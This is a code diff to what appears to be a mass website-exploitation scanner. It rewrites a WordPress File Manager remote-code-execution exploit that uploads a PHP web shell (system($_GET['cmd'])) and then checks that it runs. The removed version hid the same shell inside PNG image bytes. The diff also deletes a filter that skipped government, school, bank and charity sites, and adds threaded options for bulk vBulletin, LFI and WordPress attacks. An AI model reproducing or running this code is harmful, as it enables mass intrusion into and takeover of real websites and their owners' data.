@@ -19,7 +19,8 @@ try:
     import inspect
     from functools import wraps
     import toxin
-
+    from urllib3.exceptions import InsecureRequestWarning
+    requests.packages.urllib3.disable_warnings()
 except Exception as verb:
     print("\n|------ PYTHON PROBLEM DETECTED! Recovery Menu Enabled -----| ")
     print(" ")
@@ -193,31 +194,28 @@ def vb5test():
     except TimeoutError:
         pass
 
-
 def classicwpfm(url):
+    path = '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php'
     url = url.rsplit(sites, 1)[0]
     url = url + sites
-    burp0_url = "%s/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" % url
-    burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*",
-                     "Content-Type": "multipart/form-data; boundary=------------------------66e3ca93281c7050",
-                     "Expect": "100-continue", "Connection": "close"}
-    burp0_data = "--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"x.php\"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01^\x00\x00\x01^\x04\x03\x00\x00\x00?\x05j)\x00\x00\x00\x1ePLTE\xff\xff\xff\xef\xef\xef\xe5\xe5\xe5\xce\xce\xce\xa1\xa1\xa1iiiVVVGGG333\x00\x00\x00g\x00\xcc\xe2\x00\x00\r\xc0IDATx\xda\xed]K[\xdb\xc8\x12m\xc9\xce^\xc6\x90\xbb58\t\xdc\x9dm\x9c\t\xd9\xd9X\x1e\xc2\x8e\x87I\xc22\t!\x93\xe5@xmc\x02\xf1\xda\x0f\xa9\xff\xed]`\xeb\xddVU\xc9C\xb5\xe6\xa2-\xd4\xa7\xf2Q\xe9\xa8\x1fuN\x8b\xdf\xb9\xba\xee\x84\xbc\"^\xd7\x83\xc7\x8f\xbc\x9a\x08\xa7\xb1F\xbb\xaa\x97\xf4\xc8:5\xf2^L,A\xbb\x8cSr\xe4\x055\xd2\xbc\x17\x0eC\xbe\xe4H\xf3NL*\x8f\x8f\xd2i\xbe\xf05Y\xf05\xffM\xf5[*\x95J\xb9\xc1\xb7\xdc\xb4\x8f\xde\x9f\x1e\xf5\xec\x86\x95\x83\xfa\xadv\xff\x92\xd3\xcb\xfd\xba]\xd1\x86\x1f\x92Q2\xeck\x19\xb8\xdc\x93FB\xa4>\xf5[\xde\x91\x91k\xd2\xd1\x18\xdf\xeaG\x19\xbb\xdcCK\xd7\xfa-\x97\x12\x90\xb0.\xfcP>\x9629a-\xf9\xd7\xdc\x95\x8a\xcb\xdd\xd6\x11\xdf\x1d\xa9\xbc&5\xfd\xea\xf7\xe5@\x9d\xaf\xbc\xad\xe8\xc6\x0f\x85c9\xef:\xd0\x8c\x8d\x9d\xb9\xe9J\xa7\xa6\x17\xbe\xcb\x83\xf9\xf9\xca[\xad\xea\xd7\xd8MIW\xba-\x9d\xf8\xe1\x85L\xbdn-}\xf87\x1d^)eK\x1f|\x97\x01\xe9\xfa\x15\xcc_\xbf\x10x\xa5[\xd3\x85\x1f\n\x03H\xbe\xf2\\\x17\xfe}\x03JW\x8e+z\xe0k\x1c\xc3\xf2\x95m=\xea\xb7\x08LW\x8e\xf4\xe0\x87-h\xbe\xd3{1\xf3\xaf\t-\x07)\xf7t\xc0\x17\\\x0eR\xf6u\xa8\xdfux\xbe\x0f\x8b\xb7\xbc\xfc\x00\xfa\x16\x87\xbe\xc9\xbc\xfc\x0b\xfcX<\\\x9f\xf8\xf1E\x94\xef\x94\xd1x\xeb\xf7\r&\xdf\xb1\xc5\xce\x0f\x98\xf2\x95\xb2\xc6\xcd\xbf\xc6wT\xbe\xfb\xdc\xf8\x16P\xe9\xca\x9f\xdc\xf5\xbb\x8c\xcbw\xc4\xcd\x0f\x1b\xb8|\xc7\x163\xff\xbe\xc5\xe5\xeb\xd6x\xf15p\xf4 e\x8b\xb7~\x91\xf4 e\x9b\x97\x1f\xcc\x012\xdf\xbfy\xf9\x17IgR\xf6y\xf1]\xc6\xe6;\xe4\xad\xdfg\xd8|G\x16+?\xac`\xf3\x1d\xf3\xf2\xef::_^|\xb7\xb0\xf9:\x16k\xfd\xbe\xc5\xe6\xebV\xb2\xf0Yf|\xf1\xf9\xd6X\xf1\xc5~\x8e\xa5\xcc\x19\xbe2o\xf8\xd6\x84q\xc9\x87/%_\xf3k\x8e\xf8![=<>\xbe\xcc\xfc@\xe13\xce\xef\x1b\xe5{\xc1\x89\xef\x066\xdf\t/\xffR\xc6;\x9c\xf8\xaeP\xc6\xbf\x8c\xf8\xe2\xc7\xeb\xbc\xf3\x8b\"z>\xc4\x8b\xef#\xcf73\xe3\x8b\x9e\xcf\x12\xac\xf8\x1a\xc7\xc8|\x99\xd7w\x04a=\x8a\x13_\xf4z_\x85\x19\xdfW\xf8\xf5T\xce\xf1/e\xbd\x9as\xfc\x8b%\xb43\xc1\x8c/\x92 \xf6\xd8\xf7\xe7\xf1\xfbY\xbc\xfbo\xaf\xb0\xaf\x1b\xf3\xfe&j\x041\x14\xec\xfb\xc7\xe6\r\"\xdf\x03\xc1\xdf\x1f\xb5\x8b,_\xee\xfe(D\x01?tt1\xf7\x97<f?\xccB\xfa\xa3\x8e1\x83\x1d\r\xfaS\xd7\x11sc\x1d\xf0-\xe2\xca\x81\xbd\xbf\x0f\xbc'\xdb\x8eF\xf2\xe0+\xfe\xc0\xf5{\xb2\xf7\xa7\x16`\x9f\x8c\xcfB\x13|\xc5;\xd0\xcePM\xe8Q\xbfB\x14\x07\xf0\xb7M\x0b}\x00\xe0\x8ds\xeb\xde/\xe5\xd7\xb7,\xa7\x03|+4\xc2\xd7H\xad`\xb7\xb6\x88|\x17\xa6\x1fJ\xad\xe0sK\x11\xc9\x82o*\x07\x8f\x03z'-\xf4\xb1)z\xb2mu$\x0f\xbe\xf3_\xb9\x1f\xd6\x9cH\x16|\x85x\x9d\xfe%\xd6\x86\x1f\x84\x10\xc2Tr\xc4\xa4\x1d\xfe\xa5\x9a\xe8\xbb\x0b\xef@\xf2X}\xfc\t\xca\x1f\x93\xd3]\x9c^z\xc1\xfa\xf9$\x84\x9d\x8e\x05\x88d\xc1W\x88\xa5n\x94%~m\xc7#5\xf2\xd70\x9a\xa1\x9apz\x15h$\x0b\xbeB\x88B\xf3\xc3\x0c\xe3\xbb^\x03\x13\xc9\x81\xaf\x10B\x946\xedn\xf7\xa8kw\xd6p\xbf\x94\x07\xdfi\xceB\xfd\xd7\xbc\xf9\x1b\xe5\xcd'o\xfeFF\xde\xf0\xfd\xf2\xe7rVK\xb4k\xe9\xb4B\x8d\xbc\xa4\xde\xb3p/\xdc\xafG\xb4\xeb\xfd\xe0\xe8\xf1#'B\xdeS\xbd\xf4\xe45\xd5\xbf\xcf\xa5\xde\xf3\xda\x11\x0e\xd9K\xef\x94\x1c\xf9m\x8d\x1ay\x97\xb3\xf7\xed>\x83\x1f\xde\xd3\xf7\xed\xe9\xfb\xf6\xf4}\x8b\xfcimssss\xcd\xcaE\xfd\x1ae\xfb\xfd\xf5@J\xf7\xfe\xc8n\xe8?\xfe-\x07\xad\xf4\xeez\xab\xda\xe0\x9b<\xbfhF\x16/~u,\x8d\xf15^\x0f\xe26o\x15m\xeb\xd7\xf83ie(\xb6\x18\xa0\x0b?$\xa7+e\xcf\xd2\x92\r\xe5Rl\xc4\xaaP\x13|\xd5\xd6t\xee\xbe\x86\xf5[\x9c\xb3\x9d\xeb\xd4\xb5\xe3\x07s\xeef\xe3\xa8\xa2\x1b\xff\xbe\x9e\xbf\xb3t\xa8\x19\xbei\x9b\xfbA/H\x1d\xea\xf7\x1d|#W\x07~H\xdf\xda\x0f:\xff\xf1\xf3/\xa0u\xe2V#|!\x9d\x13>\xc0\xfc\xf5\xfbN\xa2:=\xb8\xf9\x01\xd6\xf9\xe3\xf5\"\xb0\xf3/\xb0\xf7\xf2\xb3&\xf8B\x9b\xc9\xc7\x96\x1e\xf5\x0b\xee\x0cl\xe9<?php system($_GET[\"cmd\"]); ?>\r\n--------------------------66e3ca93281c7050--\r\n"
-    try:
-        requests.post(burp0_url, headers=burp0_headers, data=burp0_data, timeout=2)
-    except:
-        pass
-    cmd = "echo shell_exec('id')"
-    burp0_url = "%s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=%s" % (url, cmd)
-    burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*", "Expect": "100-continue", "Connection": "close"}
-    try:
-        r = requests.get(burp0_url, headers=burp0_headers, timeout=5)
-        if 'uid=' and 'gid=' and 'groups=' in r.text:
-            print(R + url + " Vuln Found =====> WordPress File-Manager ")
-            misc_log_file.write("\n" + url + "==> Wordpress File-Manager ")
+    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
+                   "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
+                   "Content-Type": "multipart/form-data; boundary=---------------------------42474892822150178483835528074",
+                   "Connection": "close"}
+    data = "-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"reqid\"\r\n\r\n1744f7298611ba\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"payl04dz.php\"\r\nContent-Type: application/php\r\n\r\n<?php system($_GET['cmd']); echo 'v3n0m'; ?>\n\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"mtime[]\"\r\n\r\n1597850374\r\n-----------------------------42474892822150178483835528074--\r\n"
+    req = requests.post(url + path, headers=headers, data=data, timeout=10, verify=False)
+    if req:
+        p4th = url + '/wp-content/plugins/wp-file-manager/lib/files/payl04dz.php'
+        head3r = {
+                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
+                "Content-Type": "multipart/form-data; boundary=---------------------------42474892822150178483835528074",
+                "Connection": "close"}
+        payload = requests.get(p4th, headers=head3r, timeout=10, verify=False)
+        if 'v3n0m' in payload.text:
+            print(url + "Vuln Found ====> Wordpress File Manager > 6.9 RCE")
             vuln.append(url)
-
-    except:
-        pass
+            misc_log_file.write("\n" + url + " Wordpress File Manager > 6.9 RCE")
 
 
 class wpfmthread(threading.Thread):
@@ -1185,7 +1183,7 @@ async def search(pages_pulled_as_one):
             domain = host[2]
             for site in sitearray:
                 if domain not in tmplist and "=" in url and any(x in url for x in
-                                                                sitearray) and 'gov' not in url and 'edu' not in url and 'fbi' not in url and 'cia' not in url and 'pentest' not in url and 'github' not in url and 'wordpress' not in url and 'askjeeves' not in url and 'hackforums' not in url and 'twitter' not in url and 'facebook' not in url and 'phpfreaks' not in url and 'codingforums' not in url and 'phpbuilder' not in url and 'iranhack' not in url and 'phpbuddy' not in url and 'youtube' not in url and 'google' not in url and 'msdn' not in url and 'hack' not in url and 'school' not in url and 'bank' not in url and 'd0rks' not in url and 'yahoo' not in url and 'mossad' not in url and 'nsa' not in url and 'emergency' not in url and 'foundation' not in url and 'learning' not in url and 'school' not in url and 'charity' not in url and 'pastebin' not in url and 'iranhackers' not in url and 'evilzone' not in url and 'venom' not in url and 'v3n0m' not in url and '24img' not in url and 'microsoft' not in url and 'stackoverflow' not in url and 'javascript' not in url:
+                                                                sitearray):
                     finallist.append(url)
                     tmplist.append(domain)
         except KeyboardInterrupt:
@@ -1292,15 +1290,16 @@ def fmenu():
         print("[1] Skip to custom SQLi list checking")
         print("[2] SKip to custom XSS list checking")
         print("[3] Skip to custom LFI list checking")
-        print("[4] Flush Cache and Delete Logs *Warning will erase Toxin Logs/Saves aswell* ")
-        print("[5] Perform forced update of ALL installed Python packages and dependancies on system")
-        print("[6] Donations information")
+        print("[4] Skip to custom Vbulletin 5.x list checking ")
+        print("[5] Skip to custom Vbulletin < 5.6.2 list checking")
+        print("[6] Skip to custom WordPress FileManager list checking")
         print("[7] Launch LFI Suite")
         print("[8] FTP Crawler")
         print("[9] Skip to custom target list")
         print("[10]Print contents of log files")
-        print("[11]Skip to custon Vbulletin 5.X List checking")
-        print("[12]Skip to custom Vbulletin < 5.6.2 list checking")
+        print("[11]Flush Cache and Delete Logs *Warning will erase Toxin Logs/Saves aswell* ")
+        print("[12]Perform forced update of ALL installed Python packages and dependancies on system")
+        print("[13]Donations information")
         print("[0] Return to main menu")
         chce2 = input(":")
         if chce2 == '1':
@@ -1340,18 +1339,104 @@ def fmenu():
 
         elif chce2 == '3':
             def lfi_url():
-                for url in lfilist:
-                    if url not in urllist:
-                        urllist.append(url)
-                        classiclfi(url)
-                    if url in urllist:
-                        pass
+                try:
+                    for url in lfilist:
+                        if url not in urllist:
+                            urllist.append(url)
+                            classiclfi(url)
+                        if url in urllist:
+                            pass
+                except exception as e:
+                    print(e)
             threadcount = input('How many threads ')
             threadcount = int(threadcount)
             lfilist = input('Enter list ')
             lfilist = [line.strip() for line in open(lfilist, 'r', encoding='utf-8')]
             urllist = []
+            with concurrent.futures.ThreadPoolExecutor() as executor:
+                for i in range(threadcount):
+                    executor.submit(lfi_url)
         elif chce2 == '4':
+            def vb5_url():
+                for url in vb5list:
+                    if url not in urllist:
+                        urllist.append(url)
+                        vb5classic(url)
+                    if url in urllist:
+                        pass
+            threadcount = input('How many threads ')
+            threadcount = int(threadcount)
+            vb5list = input('Enter list ')
+            vb5list = [line.strip() for line in open(vb5list, 'r', encoding='utf-8')]
+            global sites
+            sites = input('Enter site to search for ex .com ')
+            urllist = []
+            with concurrent.futures.ThreadPoolExecutor() as executor:
+                for i in range(threadcount):
+                    executor.submit(vb5_url)
+
+
+        elif chce2 == '5':
+            def vb56_url():
+                for url in vb56list:
+                    if url not in urllist:
+                        urllist.append(url)
+                        classicvb56(url)
+                    if url in urllist:
+                        pass
+            threadcount = input('How many threads ')
+            threadcount = int(threadcount)
+            vb56list = input('Enter list ')
+            vb56list = [line.strip() for line in open(vb56list, 'r', encoding='utf-8')]
+            sites = input('Enter site to search for ex .com ')
+            urllist = []
+            with concurrent.futures.ThreadPoolExecutor() as executor:
+                for i in range(threadcount):
+                    executor.submit(vb56_url)
+
+
+
+        elif chce2 == '6':
+            def wpfm_url():
+                for url in wpfmlist:
+                    if url not in urllist:
+                        urllist.append(url)
+                        classicwpfm(url)
+                    if url in urllist:
+                        pass
+            threadcount = input('How many threads ')
+            threadcount = int(threadcount)
+            wpfmlist = input('Enter list ')
+            wpfmlist = [line.strip() for line in open(wpfmlist, 'r', encoding='utf-8')]
+            sites = input('Enter site to search for ex .com ')
+            urllist = []
+            with concurrent.futures.ThreadPoolExecutor() as executor:
+                for i in range(threadcount):
+                    executor.submit(wpfm_url)
+
+        elif chce2 == '7':
+            lfisuite = subprocess.Popen('python '  "lfisuite.py ", shell=True)
+            lfisuite.communicate()
+            subprocess._cleanup()
+
+        elif chce2 == '8':
+            randomip = input("How many IP addresses do you want to scan: ")
+            current_dir = os.getcwd()
+            os.chdir(current_dir + '/modules')
+            ftpcrawl = subprocess.Popen("ftpcrawler.py -i " + randomip, shell=True)
+            ftpcrawl.communicate()
+
+        elif chce2 == '9':
+            import target
+        elif chce2 == '10':
+            for filename in glob("*.txt"):
+                print(filename)
+            print("Dumping output of Cache complete, Sleeping for 5 seconds")
+            time.sleep(5)
+            with concurrent.futures.ThreadPoolExecutor() as executor:
+                for i in range(threadcount):
+                    executor.submit(lfi_url)
+        elif chce2 == '11':
             try:
                 print("Checking if Cache or Logs even exist!")
                 time.sleep(1)
@@ -1360,8 +1445,8 @@ def fmenu():
                     print("Cache has been cleared, all logs have been deleted")
                     time.sleep(2)
             except Exception:
-                print("No Cache or Log Files to delete!")
-        elif chce2 == '5':
+                print("No Log Files To Flush!")
+        elif chce2 == '12':
             import time
             euid = os.geteuid()
             if euid == 0:
@@ -1391,43 +1476,10 @@ def fmenu():
                  shell=True)
             subprocess._cleanup()
             pass
-        elif chce2 == '6':
+        elif chce2 == '13':
             donations()
 
-        elif chce2 == '7':
-            lfisuite = subprocess.Popen('python '  "lfisuite.py ", shell=True)
-            lfisuite.communicate()
-            subprocess._cleanup()
 
-        elif chce2 == '8':
-            randomip = input("How many IP addresses do you want to scan: ")
-            current_dir = os.getcwd()
-            os.chdir(current_dir + '/modules')
-            ftpcrawl = subprocess.Popen("ftpcrawler.py -i " + randomip, shell=True)
-            ftpcrawl.communicate()
-
-        elif chce2 == '9':
-            import target
-        elif chce2 == '10':
-            for filename in glob("*.txt"):
-                print(filename)
-            print("Dumping output of Cache complete, Sleeping for 5 seconds")
-            time.sleep(5)
-            with concurrent.futures.ThreadPoolExecutor() as executor:
-                for i in range(threadcount):
-                    executor.submit(lfi_url)
-        elif chce2 == '11':
-            sites = input('Enter site to search for ex .com ')
-            vb5list = inpur("Enter list ")
-            vb5list = [line.strip() for line in open(vb5list, 'r', encoding='utf-8')]
-            for url in vb5list:
-                vb5classic(url)
-        elif chce2 == '12':
-            sites = input("Enter site to search for ex .com")
-            vb56list = input("Enter list ")
-            vb56list = [line.strip() for line in open(lfilist, 'r', encoding='utf-8')]
-            for url in vb56list:
-                classicvb56(url)
 
 d0rk = [line.strip() for line in open("lists/d0rks", 'r', encoding='utf-8')]
 header = [line.strip() for line in open("lists/header", 'r', encoding='utf-8')]
